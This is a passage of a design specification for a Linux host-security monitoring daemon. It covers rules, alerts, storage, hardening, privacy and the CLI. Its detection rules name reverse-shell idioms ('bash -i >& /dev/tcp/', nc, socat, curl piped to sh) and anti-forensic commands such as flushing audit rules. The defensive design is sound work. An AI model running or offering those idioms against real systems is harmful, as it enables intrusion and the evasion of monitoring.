| `kmod_baseline` | module name | Approved kernel modules. |
| `config_baseline` | (file_path, sha256) | sshd_config, sudoers, sysctl etc. |

Baselines support snapshots (one per day by default, retained on a schedule) so you can compare today vs. last-week vs. last-month.

---

## §8 — Rule engine

### 8.1 Hybrid model

1. **Sigma rules** — public + custom; loaded via `pySigma` and compiled to native matchers against ECS fields.
2. **YAML correlations** — local DSL for cross-source/time-window correlations.
3. **Python plugins** — for detectors too complex for either above.

All three produce `Alert` rows via the same path.

### 8.2 YAML correlation format (`v1.0.0`)

```yaml
version: 1.0.0
id: persistence.new_systemd_user_timer
name: "New systemd user-level timer"
severity: medium
why: |
  Adversaries plant systemd user timers for persistence that survives reboot.
  False positives: you (or a package post-install) intentionally added a timer.
false_positives:
  - "Just installed a package that ships a user timer"
detect:
  any_of:
    - event.module == "services_monitor"
      AND event.action == "unit_added"
      AND service.unit ENDS_WITH ".timer"
      AND service.user_scope == true
correlate:
  within: 5m
  by:    [user.id]
  also_required:
    - event.module == "fim_watcher"
      AND file.path MATCHES "/home/*/.config/systemd/user/*"
suppress_if:
  - allowlist.path_glob_matches(file.path)
dry_run: false
```

### 8.3 Python plugin interface

```python
from inspectord.plugins import Rule, Event, Alert

class ReverseShellHeuristic(Rule):
    id = "heuristic.reverse_shell_pattern"
    version = "1.0.0"
    severity = "critical"
    why = "Catches bash -i >& /dev/tcp/... and equivalent reverse-shell idioms not in Sigma."

    def on_event(self, ev: Event) -> Alert | None:
        if ev.event_module != "process_collector":
            return None
        cmd = ev.process_command_line or ""
        if "/dev/tcp/" in cmd and "bash" in (ev.process_name or ""):
            return self.alert(ev)
        return None
```

### 8.4 Dry-run mode

Any rule may set `dry_run: true`. It still runs, but its matches are logged to `rule_dryrun_log` and **never notify**. The Rules panel displays "would have fired" counts for promotion decisions.

### 8.5 Allowlist evaluation

After a rule produces an `Alert` candidate but before persistence, the allowlist is evaluated. Matches turn into `signal` events (visible in Audit but not Alerts).

### 8.6 Per-rule stats

`rule_stats(rule_id, fire_count, last_fired_at, dryrun_count, suppressed_count, exec_time_p95_us)` — surfaced in the Rules panel. Used by the Tuning Suggestions feature (§9.6).

---

## §9 — Alert lifecycle & notification UX

### 9.1 State machine

```
[new] ──ack──► [acknowledged] ──resolve──► [resolved]
   │                  │
   └─── allowlist ────┴──► [suppressed]    (also retroactively to existing matches)
```

All transitions are logged in the audit log with: timestamp, actor (`eli@local` for user, `auto:<source>` for system), reason note.

### 9.2 Dedup keys

Every rule declares (or the engine derives) a `dedup_key`. Default formula: `<rule_id>:<primary_entity_kind>:<primary_entity_key>`. Same dedup_key within configurable window → updates existing alert's `dedup_count` and `last_seen_at` rather than creating new alert.

### 9.3 Incident grouping

Alerts that share an entity within a configurable correlation window (default 10 minutes) are auto-grouped into an `Incident`. Incidents have their own status and own narrative summary (template-rendered).

### 9.4 Notification routing

Per-severity matrix (config-editable, also via Notifications panel):

| Severity | Default sinks |
| --- | --- |
| critical | Desktop popup (urgent), Telegram, Signal |
| high | Desktop popup, Telegram |
| medium | Desktop popup |
| low | none (dashboard only) |
| info | none (dashboard only) |

Plus:

* **Quiet hours** — configurable per-sink window; criticals always pass.
* **Bundling window** — multiple alerts within N seconds collapse to one bundle notification.
* **Verbosity per sink** — `minimal` (severity + rule + ts), `summary` (short renderer; default), `full` (short + key fields including IPs/paths). Set per-sink; user controls data outflow.

### 9.5 Pending actions menu

When a rule fires, it may propose one or more actions. They become `pending_action` rows the user confirms via tray or web UI. Full action menu:

| Category | Actions |
| --- | --- |
| Process | `kill`, `suspend (SIGSTOP)`, `strace_attach`, `dump_env`, `list_open_files`. |
| File | `hash_now`, `quarantine`, `restore_from_quarantine`, `reinstall_from_package` (where applicable). |
| Network | `block_ip_nftables` (creates a scoped `inspectord_block` chain), `drop_existing_connection`, `throttle_process_bandwidth`. |
| Service | `stop`, `disable`, `mask`. |
| User / access | `lock_account`, `expire_password`, `revoke_ssh_key`. |
| Allowlist | `scope_by_entity`, `scope_by_rule`, `scope_by_path_glob`, `time_limited` (auto-expiring). |
| Case | `open_case`, `attach_to_case`, `export_case_zip`. |

Every action records to the audit log; many are reversible (revoke block, restore from quarantine).

### 9.6 Tuning suggestions

Statistical, no LLM. When a rule's `fire_count` × `false_positive_rate` exceeds a threshold against the same entity, the system surfaces a tuning suggestion in the Rules panel: "Rule X fired N times against entity Y, mostly resolved without action — propose allowlist scope?" One-click apply.

---

## §10 — Storage layout

### 10.1 DuckDB schema

| Table | Notes |
| --- | --- |
| `schema_version` | single row, current DB schema version |
| `events_enriched` | parsed + enriched event records (subset of fields; full record in journal) |
| `alerts` | see §7.2 |
| `incidents` | see §7.3 |
| `allowlist` | see §7.4 |
| `cases` | see §7.5 |
| `case_evidence` | per-evidence-artifact rows |
| `rules_registry` | (rule_id, source_format, enabled, dry_run, version) |
| `rule_stats` | per-rule counters & timings |
| `rule_dryrun_log` | dry-run matches |
| `first_seen` | (category, entity_kind, entity_key, first_at, last_at, count) |
| `baselines_*` | one table per baseline (§7.6) |
| `baseline_snapshots` | dated copies for drift-over-time |
| `vulnerabilities` | (package, version, cve, severity, fixed_in, advisory_url, ack_status) |
| `pending_actions` | (id, kind, target, status, created_at, decided_at, decided_by, result) |
| `audit_log` | hash-chained admin actions |
| `worker_health` | per-worker rolling metrics |
| `notifications_sent` | record of every outbound notification |
| `system_baselines_self` | inspectord's own CPU/RAM history for self-anomaly |

### 10.2 Raw event journal

* Path: `/var/lib/inspectord/journal/YYYY-MM-DD.jsonl.gz`.
* Format: NDJSON, gzip-compressed, rotated daily.
* Each line includes `prev_hash` (the SHA-256 of the previous line + this line's content). Tampering breaks the chain.
* Retention: configurable (default 30 days; profile-dependent).

### 10.3 Forensic store

* Path: `/var/lib/inspectord/evidence/<sha256[0:2]>/<sha256>`.
* Files preserved by `evidence_collector` and the `quarantine` action.
* Manifest at `/var/lib/inspectord/evidence/manifest.json` (also versioned).
* Owned by `inspectord:inspectord`, mode `0640`.

### 10.4 Retention & rotation

* Per-table retention policies in config; defaults profile-aware.
* Disk-quota cap: if storage dir exceeds configured cap, oldest non-critical journal files are pruned first.
* Critical alerts and their evidence are never auto-pruned; user must explicitly delete.

### 10.5 Encryption at rest

* Default: not encrypted by the app (assumes LUKS FDE).
* Optional: `storage.encrypt_at_rest: true` enables per-database encryption with key stored via `libsecret` or systemd credentials.

---

## §11 — Enrichment & threat intel

### 11.1 Enrichment pipeline

Runs between parser and router. Pluggable enrichers in `inspectord/enrichment/`:

| Enricher | Effect |
| --- | --- |
| `process` | Resolve pid → executable path → SHA-256; parent chain; cgroup; user/group lookup. |
| `file` | Resolve path → SHA-256 (cached by inode+mtime); owner/mode/setuid. |
| `network` | GeoIP (MaxMind GeoLite2 free DB, locally bundled) + ASN; reverse DNS (cached). |
| `user` | uid → name → groups; effective vs. real. |
| `threat_intel` | Hash/IP/domain match against indicator DB; populate `threat.indicator.*`. |
| `first_seen` | Marks `event.first_seen=true` for novel entities; updates `first_seen` table. |

### 11.2 Threat intel feeds

* All feed fetches are **off by default**. User opts in per-feed.
* Supported feed kinds: AbuseIPDB, AlienVault OTX, MalwareBazaar (Abuse.ch), URLhaus, Tor exit nodes, a generic "newline-delimited indicators" loader for local files.
* Refresh cadence configurable; outbound HTTPS only goes to user-configured URLs. Optional HTTP proxy / Tor (`socks5://...`).
* Indicator DB is local (DuckDB table `intel_indicators` with `schema_version`).
* User can disable all outbound fetches and load indicator lists from local files only.

---

## §12 — Behavioral / anomaly detection

This is what makes the product more than "rules + state diffs."

### 12.1 Statistical anomaly

* Per `(metric_kind, entity_key)` rolling window (sliding 1 h, 24 h, 7 d).
* Compute rolling mean + standard deviation.
* Emit anomaly events when the latest sample's z-score exceeds a configurable threshold (default ±3.0) AND the entity has been observed enough times to establish a baseline (default 50 samples).
* Tracked metrics: events/min per (process, category), outbound-bytes/min per process, new-connection-rate per process, login frequency per user, sudo rate per user, file-write rate per directory.

### 12.2 First-sighting

* Maintains `first_seen` table.
* On any enriched event, looks up `(category, entity_kind, entity_key)`; if missing, marks `event.first_seen=true` and inserts row.
* Specific first-sighting rules in the starter pack: first-execution of binary, first outbound dest for a process, first login from IP, first kmod load, first SUID file.

### 12.3 Temporal pattern (beaconing)

* For repeated outbound connections to same `(dst.ip, dst.port)` from same process, compute inter-arrival-time variance.
* Low variance + small interval ⇒ beaconing signature (classic C2 indicator). Emit medium-severity alert with `rule.why` explaining.

### 12.4 Per-entity behavioural baselines

* For long-lived entities (services, daemons), maintain CPU%/RAM/network/disk baselines.
* Sustained 5× deviation over configurable window ⇒ anomaly alert (cryptominer signal, runaway process, possible compromise).

### 12.5 Output

All anomaly outputs are `Alert` rows with `event.category=anomaly`, severity depending on the metric and z-score. They go through the same allowlist/dedup/notification pipeline as rule-engine alerts.

---

## §13 — Evidence preservation & cases

### 13.1 Triggering

`evidence_collector` subscribes to alerts with severity ≥ high. On match it executes **before** the notifier dispatches:

1. **Hash + capture** any implicated files referenced by `file.path` to the forensic store.
2. **Snapshot process tree** rooted at the implicated process (PIDs, exe paths, hashes, cmdlines, cwd, env, open fds, mapped libraries) into the evidence.
3. **Snapshot network state** at moment of detection (`ss -anp` equivalent) — listening sockets, established connections.
4. **Bundle recent events** for the entity (±5 min window) into the case.
5. Create a `Case` row referencing all of the above.
6. Notify.

### 13.2 Why "before notify"

By the time a user sees a popup and starts investigating, the attacker (or even just a misbehaving process) may have moved files, killed itself, or rewritten the evidence. Pre-notification capture is the difference between "we caught it" and "we saw it run away."

### 13.3 Storage

See §10.3. Files are stored by SHA-256; multiple alerts referencing the same file share storage.

### 13.4 Cases

A case is a user-curated bundle of alerts, incidents, entities, and evidence with notes. Exportable as a ZIP archive containing:

* `case.json` (the case record)
* `events/*.jsonl` (event bundles)
* `alerts/*.json` (alert records)
* `evidence/<sha256>` (preserved files)
* `narrative.md` (template-rendered summary)
* `audit.log` (every action on this case)

Cases are designed for personal-archive use (preserve what happened in case you need it later) and for sharing with a security professional if you ever bring one in.

### 13.5 Chain of custody

Every operation on a case (open, attach alert, add note, export, close) is logged in the audit log.

---

## §14 — Entity-centric navigation

### 14.1 Entities

Recognised entity kinds:

| Kind | Key format |
| --- | --- |
| process | `pid:<pid>@boot:<boot_id>` (boot-scoped to disambiguate reused pids) |
| executable | `exe:<sha256>` |
| user | `user:<username>` |
| ip | `ip:<address>` |
| domain | `dom:<fqdn>` |
| file | `file:<sha256>` or `file:<absolute_path>` if not hashed |
| port | `port:<addr>:<port>` |
| service | `svc:<unit_name>` |
| device | `dev:<vendor:product:serial>` |
| package | `pkg:<name>` |

### 14.2 Context card content

Opens as a modal from anywhere in the UI. Contents:

1. **Header**: entity kind + key; first-seen timestamp; baseline status; threat-intel matches.
2. **Recent events** for this entity across all collectors (last 24 h by default).
3. **Open alerts** referencing this entity.
4. **Related entities**: e.g. for a process — its parent, children, executable hash, open ports, outbound IPs; for an IP — every process that talked to it, every alert referencing it, geo/ASN.
5. **Pending actions** scoped to this entity (kill process, block IP, etc.).
6. **Quick-allowlist**: one-click "trust this entity for rule X" with optional expiry.

### 14.3 Linking

Every renderer output emits HTML-marked entity references (`<span data-entity-kind=... data-entity-key=...>`). Clicking opens the card. The IPC supports `get_entity_card(kind, key)` returning a `EntityCard` JSON object backed by a DuckDB query.

---

## §15 — CVE / vulnerability awareness

### 15.1 `vuln_scanner` worker

* On schedule (default daily) and on package change:
  1. Read installed packages from `pacman -Qi` (or distro-specific equivalent).
  2. Fetch the Arch Security Advisories JSON feed (and/or NVD subset) via the user's configured feed URL.
  3. Match installed `name@version` against advisories.
  4. Write rows to `vulnerabilities` table.
  5. Emit alerts when a Critical/High CVE appears that wasn't previously known.
* Feed fetches are OFF by default — user enables in Settings. Local advisory JSON file is also supported (no outbound traffic).

### 15.2 UI surface

Posture → Vulnerabilities panel:

* List with columns: package, installed version, CVE, severity, fixed-in, advisory link, ack status.
* Filter by severity / package / acknowledged.
* Suggested action: "Run `pacman -Syu <pkg>` to fix" — proposed as a pending action; user clicks to apply.

### 15.3 Why this matters

A personal security console without CVE visibility ignores the most common compromise path on a desktop (out-of-date packages). It's also one of the cheapest signals to deliver — packages + advisories is structured data.

---

## §16 — IPC, polkit, tray, web dashboard

### 16.1 IPC protocol

* Transport: Unix socket at `/run/inspectord.sock`, owner `inspectord:inspectord-clients`, mode `0660`.
* Protocol: **JSON-RPC 2.0** with a `schema_version` field per request.
* Auth: `SO_PEERCRED` checks client uid/gid. Read-only methods allowed for uids in `inspectord-clients` group; mutating methods require a **polkit policy** action (`org.inspectord.<verb>`), which prompts the user the first time and remembers grants.

### 16.2 IPC method surface (excerpt)

```
list_alerts(filter, limit) -> Alert[]
get_alert(id) -> Alert
ack_alert(id, note)                     [polkit]
resolve_alert(id, note)                 [polkit]
suppress_alert(id, allowlist_scope)     [polkit]
list_pending_actions() -> PendingAction[]
approve_pending_action(id)              [polkit]
reject_pending_action(id, reason)       [polkit]
get_entity_card(kind, key) -> EntityCard
search_events(query, time_range) -> Event[]
list_rules(filter) -> RuleSummary[]
toggle_rule(id, enabled)                [polkit]
list_allowlist() -> AllowlistEntry[]
add_allowlist_entry(entry, reason)      [polkit]
revoke_allowlist_entry(id)              [polkit]
list_cases() -> Case[]
open_case(title, alert_ids)             [polkit]
attach_to_case(case_id, ref)            [polkit]
export_case(case_id, dest_path)         [polkit]
get_health() -> HealthReport
get_baseline(name) -> BaselineSnapshot
run_scanner(name)                       [polkit]
reload_config()                         [polkit]

# Dependency management (§30)
list_dependencies() -> DependencyStatus[]
plan_dependency_install(filter?) -> DepPlan          # dry-run, no privileged calls
apply_dependency_plan(plan_id)          [polkit]     # executes a plan the user reviewed
configure_dependency(name)              [polkit]     # apply / re-apply our sidecar config
verify_dependency(name) -> VerifyReport
restore_dependency_config(name, backup_id) [polkit]  # roll back our config drop-in to a prior backup
remove_dependency_dropin(name)          [polkit]     # delete our config drop-in (does not uninstall the package)
get_dep_audit(name) -> DepAuditEntry[]

subscribe(channel, filter)              # for live streams
```

### 16.3 Tray app (`inspectorctl-tray`)

* Per-user systemd `--user` service.
* Tray icon shows posture state (green/yellow/red) and unread count.
* Click → menu: open dashboard, recent alerts, pending actions, snooze notifications, quit.
* Listens for `subscribe('alerts')` and shows D-Bus desktop notifications for routed alerts.

### 16.4 Local web dashboard

* User-mode service (`inspectorctl-web`) bound to `127.0.0.1:<port>`; never binds external interfaces. No upstream proxy support.
* No external CDN; all assets served locally.
* CSRF tokens on mutating endpoints.
* Session cookie signed with a per-user secret in `~/.config/inspectorctl/`.
* Optional local TLS via a self-signed cert generated on first run.

### 16.5 Tech choices

* Backend: Python + FastAPI for the user-mode web service that mediates between browser and IPC.
* Frontend: server-rendered HTML (Jinja2) for the primary navigation + a small amount of HTMX for live updates; a single SPA framework is intentionally avoided to keep the bundle small and dependencies minimal.
* Live streams: server-sent events (SSE) for the Live Events tab and notification updates.

---

## §17 — Privilege model & hardening

### 17.1 Per-worker capabilities

Each worker is launched with a `CapabilityBoundingSet=` containing only what it needs, and drops to that set immediately after init.

| Worker | Caps |
| --- | --- |
| `log_tailer` | `CAP_DAC_READ_SEARCH`, `CAP_SYSLOG` |
| `process_collector` | `CAP_BPF`, `CAP_PERFMON`, `CAP_SYS_PTRACE` |
| `fim_watcher` | `CAP_DAC_READ_SEARCH`, `CAP_SYS_ADMIN` (fanotify) |
| `nids_bridge` | (none — Suricata sub-process has its own) |
| `scanner_runner` | `CAP_DAC_READ_SEARCH`, scanner-specific |
| `udev_monitor` | `CAP_NET_ADMIN` (netlink) |
| `outbound_connection_tracker` | `CAP_NET_ADMIN`, `CAP_BPF` |
| `kmod_watcher` | none |
| `services_monitor` | none (D-Bus client) |
| `firewall_inspector` | `CAP_NET_ADMIN` |
| `enrichment_worker` | none |
| `intel_updater` | none |
| `rule_engine` | none |
| `anomaly_detector` | none |
| `evidence_collector` | `CAP_DAC_READ_SEARCH` |
| `vuln_scanner` | none |
| `drift_detector` | `CAP_DAC_READ_SEARCH` |
| `hardening_auditor` | `CAP_DAC_READ_SEARCH` |
| `notifier` | none |
| `ipc_server` | none |
| `watchdog` | none |

### 17.2 systemd hardening directives (in `inspectord.service`)

```
ProtectSystem=strict
ProtectHome=read-only
PrivateTmp=true
PrivateDevices=false           # eBPF needs /sys/kernel/debug etc.
NoNewPrivileges=true            # at worker level; supervisor needs caps
RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6 AF_NETLINK AF_PACKET
SystemCallFilter=@system-service @network-io @file-system
SystemCallErrorNumber=EPERM
LockPersonality=true
RestrictRealtime=true
RestrictSUIDSGID=true
RestrictNamespaces=true
ProtectKernelLogs=false         # we read kmsg
ProtectKernelModules=false      # process_collector needs eBPF; others restricted via per-unit overrides
MemoryDenyWriteExecute=true
ReadWritePaths=/var/lib/inspectord /var/log/inspectord /run/inspectord
MemoryMax=<profile-dep>
CPUQuota=<profile-dep>
```

### 17.3 AppArmor profile

Ship `/etc/apparmor.d/inspectord` denying writes outside `/var/lib/inspectord/`, `/var/log/inspectord/`, `/run/inspectord/`. SELinux profile is out of v1 scope.

### 17.4 Seccomp

Per-worker seccomp filters, generated from a `seccomp.yaml` allowlist in each worker's `manifest.toml`. Default-deny on rare syscalls (`process_vm_writev`, `ptrace` for non-process-collector workers, `bpf` for non-eBPF workers, etc.).

### 17.5 IPC auth recap

* Read-only methods: client uid in `inspectord-clients` group + `SO_PEERCRED`-verified.
* Mutating methods: polkit prompt the first time per action; persistent grant cached per uid.

### 17.6 Web dashboard auth

* Localhost-only.
* CSRF tokens on mutations.
* Session cookie + per-session token bound to peer uid.
* Optional self-signed TLS, generated and stored in `~/.config/inspectorctl/`.

---

## §18 — Privacy & data-flow posture

### 18.1 Default rule

**No data leaves the host. Every egress is explicit, opt-in, and enumerated here. There is no telemetry, no analytics, no phone-home, and no LLM integration.**

### 18.2 Egress table

| Egress | Default | Notes |
| --- | --- | --- |
| Telegram notifications | opt-in, off | Sends rendered alert content per configured verbosity; never raw events. |
| Signal notifications | opt-in, off | Same as Telegram. |
| Threat-intel feed fetches | opt-in, off | Outbound HTTPS GETs to user-configured feed URLs. Feeds see your IP; no event data sent. Optional HTTP proxy / Tor. |
| Rule-pack updates | opt-in, off | Pulls signed rule packs from a user-configured URL on demand. No system data sent. |
| CVE feed fetches | opt-in, off | Outbound HTTPS GETs for Arch Security Advisories or NVD subset. No system data sent. |
| GeoIP DB updates | opt-in, off | MaxMind GeoLite2 free DB; ships with the package and is refreshed only on user command. |
| Crash reporting | never | Crashes log locally to `/var/log/inspectord/` only. |
| Application telemetry | never | None exists. |

### 18.3 Verbosity controls

Per-sink: `minimal` / `summary` (default) / `full`. The user can pick how much detail leaves the box on every outbound notification.

### 18.4 Secret storage

* Telegram bot token, Signal credentials, intel-feed API keys — never in plaintext config.
* Stored via `libsecret` / gnome-keyring when available.
* Fallback: passphrase-encrypted file in `/var/lib/inspectord/secrets.enc`, key derived from a passphrase stored in systemd credentials.

### 18.5 Audit visibility

Every outbound notification and every feed fetch is recorded in the `notifications_sent` and `intel_fetches` tables. The user can see exactly what left the host and when.

---

## §19 — Bootstrap, baseline & learning mode

### 19.1 First-run wizard

Triggered on first `inspectorctl` invocation or via `inspectorctl setup`. Steps:

0. **Dependency check & install (§30)** — `dependency_manager` runs `plan_dependency_install` to detect missing/outdated external tools required by the selected profile and flags. The wizard shows the user the full **install plan**: which packages will be installed via which package manager, with exact commands. User reviews and approves; install runs under polkit. Then sidecar configs are dropped and each tool is verified end-to-end. The wizard cannot proceed to step 1 until all *required* dependencies are healthy (optional deps may be skipped with explicit user opt-out).
1. Choose profile (`minimal` / `standard`); default `standard`. (Note: this is asked **before** step 0 in practice so step 0 knows which deps are required; the numbering here reflects logical setup order, not UI order.)
2. Enable/disable Suricata bridge (heaviest component); if enabled, dep_manager adds Suricata to the install plan.
3. Choose retention (defaults profile-dependent).
4. Configure notification sinks (all default off).
5. Build initial baselines:
   * AIDE database for FIM.
   * Services snapshot.
   * Listening-port snapshot.
   * SUID/SGID inventory.
   * Package inventory.
   * Users / sudo membership snapshot.
   * `~/.ssh/authorized_keys` snapshot.
   * Kernel module list snapshot.
   * Persistence snapshot (cron / timers / autostart / rc files).
6. Optionally: download GeoIP DB now (opt-in).
7. Enable learning mode for the configured duration.

### 19.2 Learning mode

Duration default: 7 days. Behaviour:

* All collectors run normally and events are stored.
* **Signature-based rules (Sigma + curated YAML) DO notify** — these match known-bad and shouldn't wait.
* **Behavioral / anomaly / first-sighting rules log to DB but do NOT notify** — they're building up baselines.
* The dashboard shows a "Learning mode" banner with the days remaining and a list of "would-have-fired" alerts you can inspect.
* On promotion (auto on expiry, or manual), the user is shown an aggregated summary: which rules would have been noisy, with one-click "raise threshold," "add allowlist," or "disable."

### 19.3 Baseline refresh

* Manual: any baseline can be re-snapshotted from the relevant panel.
* Automatic daily snapshots are taken for drift-over-time analysis.

---

## §20 — Self-protection

### 20.1 Watchdog

Separate systemd unit `inspectord-watchdog.service`. Tasks:

* Verify `inspectord.service` is `active` every 30 s.
* If not, attempt restart with `systemctl restart inspectord`.
* If restart fails 3× in a row, write a `monitor_down` event to a local file (read by inspectord on next start), and (if configured) send a critical notification via a minimal direct-Telegram-call path that bypasses the dead daemon.

### 20.2 Self-FIM

The starter rule pack includes FIM rules covering:

* `/usr/bin/inspectord*`, `/usr/lib/inspectord/`, our scripts.
* `/etc/inspectord/` and `/etc/systemd/system/inspectord*.service`.
* The rule files themselves (`/var/lib/inspectord/rules/`).

Modifications fire a critical alert.

### 20.3 Anti-evasion detections

* `systemctl stop inspectord` / `kill -9 inspectord` while the service is running normally → critical event.
* `journalctl --rotate` / `journalctl --vacuum-*` outside of routine maintenance → high event.
* `auditctl -D` (audit rules flushed) → critical event.
* The watchdog or supervisor flushing/disabling our own collectors → audit-logged + alert.

### 20.4 Hash-chained audit log

The `audit_log` table is append-only at the application layer, each row carries `prev_hash` like the event journal. Tampering is detectable.

### 20.5 Append-only journal

Already described in §6.3 / §10.2 — the raw event journal is hash-chained.

### 20.6 Self-anomaly

`anomaly_detector` includes inspectord's own CPU/RAM as a tracked entity. Sustained anomalies on the monitor itself fire a `monitor_health_anomaly` event. Catches leaks, runaway loops, or attempted resource exhaustion attacks.

---

## §21 — Starter rule pack

Ships in `inspectord/rules/starter/` with `version: 1.0.0`. All rules carry `why:` and `false_positives:` fields. Indicative inventory:

| Category | Rule IDs (examples) |
| --- | --- |
| Reverse shell / LOLBin | `lolbin.bash_dev_tcp`, `lolbin.curl_pipe_sh`, `lolbin.python_exec_b64`, `lolbin.nc_listener`, `lolbin.socat_reverse`. |
| Privilege escalation | `privesc.new_suid`, `privesc.sudoers_modified`, `privesc.passwd_shadow_modified`, `privesc.pkexec_unusual_invocation`. |
| Persistence | `persistence.new_cron`, `persistence.new_systemd_unit`, `persistence.new_systemd_user_timer`, `persistence.autostart_changed`, `persistence.shell_rc_modified`, `persistence.authorized_keys_changed`. |
| Process behaviour | `proc.web_server_spawns_shell`, `proc.unexpected_child_of_systemd`, `proc.kernel_module_loaded_unknown`, `proc.raw_socket_unprivileged`. |
| Network | `net.outbound_to_threat_intel_ip`, `net.beacon_pattern`, `net.first_seen_outbound_to_country`, `net.new_listener_unexpected_port`. |
| Anti-malware | `av.rkhunter_warning_or_worse`, `av.clamav_signature_hit`, `av.yara_high_confidence_hit`, `av.aide_change_outside_pkgmgr`. |
| Cryptominer heuristics | `miner.process_name_match_xmrig_family`, `miner.cpu_anomaly_plus_pool_connection`. |
| Self / monitor | `self.inspectord_stopped`, `self.fim_self_files_changed`, `self.auditd_rules_flushed`, `self.journald_cleared`. |
| Anomaly | `anomaly.first_login_from_country_x`, `anomaly.first_outbound_dest_for_process`, `anomaly.process_egress_volume_spike`, `anomaly.beacon_signature`. |
| Vulnerability | `vuln.installed_package_critical_cve`. |
| Hardening | `hardening.ssh_password_auth_enabled`, `hardening.coredump_world_readable`, `hardening.kernel_pointers_unrestricted`. |
| Devices | `device.mass_storage_attached`, `device.new_network_interface`. |

Each rule lives in a single YAML/Sigma file (or Python module). The rule pack is versioned; updates are explicit opt-in.

---

## §22 — Deployment profiles & resource budgets

### 22.1 Profiles

| Profile | Includes | Target budget |
| --- | --- | --- |
| `minimal` | `log_tailer`, `fim_watcher`, `udev_monitor`, `listening_socket_snapshotter`, `services_monitor`, `firewall_inspector`, `package_monitor`, `kmod_watcher`, `enrichment_worker`, `rule_engine`, `anomaly_detector` (lite mode), `evidence_collector`, `vuln_scanner`, `drift_detector`, `hardening_auditor`, `notifier`, `ipc_server`, `watchdog`. **No NIDS.** Tray + popups only (no web UI). | <200 MB RAM, <2 % CPU idle, <500 MB disk (with 7-day retention). |
| `standard` (default) | Everything in `minimal` + `process_collector` (eBPF) + `outbound_connection_tracker` + scheduled scanners (rkhunter / AIDE / YARA; ClamAV optional flag) + local web dashboard. NIDS bridge is **off by default but flag-enabled** within `standard`. | <500 MB RAM (<800 MB with NIDS), <5 % CPU idle, <2 GB disk (30-day retention). |

Extras (e.g., threat-intel feed fetches, ClamAV scheduling, GeoIP DB) are individual config flags, not profile changes.

### 22.2 Enforcement

* Each worker has a per-profile `MemoryMax` and `CPUQuota` in its systemd drop-in.
* The supervisor refuses to start workers whose declared budgets exceed the profile cap; flips the profile to `degraded` and emits a `health_event`.
* The Health panel shows current usage vs. budget per worker.

### 22.3 Switching profiles

`inspectorctl profile set <minimal|standard>` → atomic config change, hot-reload, no reinstall.

---

## §23 — Configuration model

### 23.1 Files

| Path | Owner | Purpose |
| --- | --- | --- |
| `/etc/inspectord/config.toml` | root | system-wide settings: profile, retention, workers enabled, secrets backend choice, polkit caching |
| `/etc/inspectord/rules.d/*.{yaml,sigma,py}` | root | rule files (starter pack + user-added) |
| `/etc/inspectord/allowlist.toml` | root | declarative allowlist (in addition to DuckDB entries created via UI) |
| `~/.config/inspectorctl/ui.toml` | user | UI prefs (theme, density, hotkeys) |
| `/var/lib/inspectord/state/` | inspectord | runtime state (baselines snapshots, intel cache) |
| `/var/log/inspectord/` | inspectord | application logs |

### 23.2 Versioning

Every config file has a `version` field at the top:

```toml
version = "1.0.0"
profile = "standard"
[retention]
events_days = 30
alerts_days = 365
```

Loader refuses files with major-version mismatch and runs migration if minor-version is older.

### 23.3 Atomic writes

All config mutations (from the UI or CLI) write to `<file>.tmp` and `rename(2)` it into place. Loader validates with `jsonschema` (or `tomli` + pydantic) before apply. Invalid configs roll back; daemon never starts on invalid config.

### 23.4 Hot reload

`SIGHUP` to supervisor → reloads config, propagates to workers via stdin reload message. Failures roll back to the prior config and emit `config_reload_failed`.

---

## §24 — CLI surface (`inspectorctl`)

The CLI has parity with the web UI for everything except interactive triage.

```
inspectorctl status                       # daemon + per-worker health
inspectorctl setup                        # first-run wizard
inspectorctl profile set <profile>
inspectorctl reload-config

inspectorctl alerts list [--severity ...] [--rule ...] [--since ...] [--status ...]
inspectorctl alerts show <id>
inspectorctl alerts ack <id> [--note ...]
inspectorctl alerts resolve <id> [--note ...]
inspectorctl alerts suppress <id> --scope <scope>
inspectorctl alerts watch                 # live stream

inspectorctl events tail [--filter ...]   # tail -f-style
inspectorctl events search "<query>"      # KQL-ish syntax compiled to SQL
inspectorctl hunt save <name> "<query>"
inspectorctl hunt run <name>

inspectorctl entity show <kind> <key>     # context card as JSON
inspectorctl pending list
inspectorctl pending approve <id>
inspectorctl pending reject <id> --reason ...

inspectorctl allowlist list
inspectorctl allowlist add <scope> --reason ...
inspectorctl allowlist revoke <id>

inspectorctl rules list
inspectorctl rules enable <id>
inspectorctl rules disable <id>
inspectorctl rules dryrun <id> [--on|--off]
inspectorctl rules stats <id>

inspectorctl scanners run <name>
inspectorctl scanners schedule list
inspectorctl scanners schedule set <name> <cron>

inspectorctl baseline list
inspectorctl baseline refresh <name>
inspectorctl baseline diff <name> [--since ...]

inspectorctl notifications test <sink>
inspectorctl notifications history

inspectorctl reports generate <daily|weekly> [--out ...]

inspectorctl backup export <path>         # config + allowlist + custom rules
inspectorctl backup import <path>

inspectorctl self-test                    # synthetic events end-to-end
inspectorctl bench-rules

# Dependency management (§30)
inspectorctl deps status                                 # what's installed, missing, outdated, misconfigured
inspectorctl deps plan [--profile ...] [--include ...] [--exclude ...]   # show install plan, don't apply
inspectorctl deps install [--from-plan <id>|--yes]       # execute plan after user confirms
inspectorctl deps configure <name>                       # (re)apply our sidecar config for a tool
inspectorctl deps verify <name>                          # run end-to-end probe for a single tool
inspectorctl deps verify-all
inspectorctl deps backup list <name>                     # show our config-backup history for a tool
inspectorctl deps restore <name> <backup_id>             # roll our drop-in back to a prior snapshot
inspectorctl deps remove-dropin <name>                   # delete our config drop-in (does not uninstall the package)
inspectorctl deps audit <name>                           # full action history for a dependency

inspectorctl version
```

Shell completions for bash/zsh ship in the package.

---

## §25 — Testing strategy

### 25.1 Unit

* Every parser has a `tests/parsers/<source>/fixtures/*.{json,txt}` fixture set with paired `expected.json` normalized events.
* Every renderer has fixture-paired snapshot tests.
* Pydantic models validate every schema.

### 25.2 Rule engine

* Each starter rule ships with a `tests/rules/<rule_id>/`:
  * `should_fire/*.event.json` (events that must produce an alert)
  * `should_not_fire/*.event.json` (events that must not)
* Rule unit-test runner walks the directory in CI.

### 25.3 Event replay harness

* `inspectorctl replay <journal>` feeds a journal back through the engine (read-only — does not notify, does not persist new alerts unless `--persist`).
* Used for rule development, regression tests, and "what would have fired" analysis.

### 25.4 Integration

* A test harness brings up `inspectord` in a transient systemd-nspawn container with synthetic collectors injecting events.
* Asserts end-to-end alert + notification (with mock notifier sinks).
* Validates polkit + IPC + tray subscriptions.

### 25.5 Self-test (production)

